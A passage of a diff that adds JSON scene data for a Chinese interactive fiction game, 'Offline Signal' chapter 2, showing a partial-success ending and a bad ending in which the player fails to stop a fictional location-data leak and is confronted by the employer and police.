red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]\n\n\n[bold]数据导出停止了。[/bold]\n\n\n最终统计：\n[dim]  总用户数：    2,340,000[/dim]\n[red]  已泄露：      1,934,000 (82.6%)[/red]\n[green]  已保护：        406,000 (17.4%)[/green]\n\n[dim]你没能救所有人。190 万人的实时位置数据已经流出到境外服务器。\n但 40 万人的数据保住了——包括仁济医院的急救车辆调度数据。[/dim]\n\n\n窗外，天已经大亮了。\n\n你的手机震了一下。\n\n[yellow]短信 - 未知号码 07:59 AM：\n谢谢。\n—— 陈默[/yellow]\n\n\n然后，另一条消息进来：\n\n[red]Slack DM - 赵明 07:59 AM：\n{player_name}，deploy log 显示你刚刚重启了 geo-core。\n而且你的 SSH key 签名出现在了一个很有趣的 commit 上。\n\n我们需要谈谈。\n\n9 点不用来会议室了。\n来我办公室。\n现在。[/red]\n\n\n[dim]......[/dim]\n\n\n你合上笔记本。\n站起来。\n看了一眼窗外的天空——清晨的阳光照在对面的楼上。\n\n你拿起手机，拿起钥匙，打开门。\n\n第一次，你清醒地走出了这个房间。\n\n\n[bold]第二章完。[/bold]\n\n\n[dim cyan]>>> 信号正在重新连接...... <<<[/dim cyan]\n[dim cyan]>>> SHEPHERD 的身份仍是未知。<<<[/dim cyan]\n[dim cyan]>>> 陈默在哪里？<<<[/dim cyan]\n[dim cyan]>>> 第三章即将到来...... <<<[/dim cyan]\n\n\n[bold]感谢游玩《离线信号》第二章[/bold]\n[dim]输入 [bold]quit[/bold] 退出游戏。[/dim]",
+      "items": [],
+      "commands": {},
+      "transitions": {}
+    },
+    {
+      "id": "bad_ending",
+      "name": "BAD END",
+      "ascii_art": "the_mirror.png",
+      "description": "你什么都没做。时间到了。",
+      "on_enter": "[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：07:55 AM\n  ⏰ 后门全面触发：08:00 AM\n  ⏰ 剩余时间：5 分钟\n  📊 已泄露数据：2,280,000 / 2,340,000 (97.4%)\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[dim]你坐在椅子上，看着屏幕上的数字跳动。\n\n2,290,000...\n2,310,000...\n2,330,000...[/dim]\n\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ 当前时间：08:00 AM\n  📊 已泄露数据：2,340,000 / 2,340,000 (100.0%)\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[bold red]导出完成。[/bold red]\n\n\n最终统计：\n[dim]  总用户数：    2,340,000[/dim]\n[red]  已泄露：      2,340,000 (100%)[/red]\n[green]  已保护：              0 (0%)[/green]\n\n[dim]234 万条实时位置记录。全部流出。\n三家医院的急救调度。城市公交轨迹。共享出行数据。\n全部落入境外服务器。[/dim]\n\n\n[dim]......[/dim]\n\n\n一切安静了。\n数据流停止了——不是因为被阻止，而是因为已经没有什么可以偷的了。\n\n你盯着空白的终端。\n\n你手里有 killswitch。你有密钥。你有一切。\n你本可以阻止这一切。\n\n[bold red]你选择了什么都不做。[/bold red]\n\n\n[dim]......[/dim]\n\n\n手机震了一下。\n\n[yellow]短信 - 未知号码 08:03 AM：\n我们找到了后门的证据链。\n你的 SSH key 签名在 commit b8e224f 上。\n但 killswitch 呢？陈默说你会执行的。\n\n……你没有执行？\n\n—— 莫然[/yellow]\n\n\n然后，另一条消息：\n\n[red]Slack DM - 赵明 08:05 AM：\n{player_name}，安全团队完成了流量分析。\n你的机器是数据外泄的源头。你的 SSH key 签了那个 commit。\n\n我已经通知了法务和 HR。\n警方也在路上。\n\n别跑。[/red]\n\n\n[dim]门外传来脚步声。\n\n你可以解释你是无辜的。你可以说你是被操控的。\n但 234 万条数据已经泄露了——全部。\n没有 killswitch 的记录来证明你试图阻止。\n没有任何证据显示你做过任何事。\n\n因为你确实什么都没做。[/dim]\n\n\n[bold red]你失去了一切。不是因为 SHEPHERD 控制了你。而是因为你清醒地选择了什么都不做。[/bold red]\n\n\n[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]\n[bold red]                  BAD END[/bold red]\n[bold red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold red]\n\n\n[dim]输入 [bold]quit[/bold] 退出游戏。\n输入 [bold]restart[/bold] 从第二章开头重新开始。\n\n也许这次，你会做出不同的选择。[/dim]",
+      "items": [],
+      "commands": {
+        "restart": {
+          "name": "restart",
+          "response": "[dim]时间倒流……你回到了部署终端前。\n这次，你会做出不同的选择吗？[/dim]",
+          "transition": "defuse"
+        }
+      },
+      "transitions": {}
+    }
+  ]
+}
